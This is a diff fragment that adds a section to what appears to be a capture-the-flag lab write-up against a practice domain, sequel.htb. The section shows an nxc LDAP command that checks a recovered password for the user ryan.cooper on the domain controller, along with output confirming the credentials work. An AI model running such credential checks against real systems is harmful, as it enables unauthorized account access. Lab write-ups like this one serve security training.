@@ -342,5 +342,14 @@ Found the SQL server dir
 Looks like ive found a password, ill test if these are valid
 
 # Compromising `ryan.cooper`
+```python
+nxc ldap dc.sequel.htb -u ryan.cooper -p NuclearMosquito3                                            
+LDAP        10.129.7.162    389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb) (signing:Enforced) (channel binding:Never)
+LDAP        10.129.7.162    389    DC               [+] sequel.htb\ryan.cooper:NuclearMosquito3
+```
+Another user compromised
 
+```python
+
+```
 
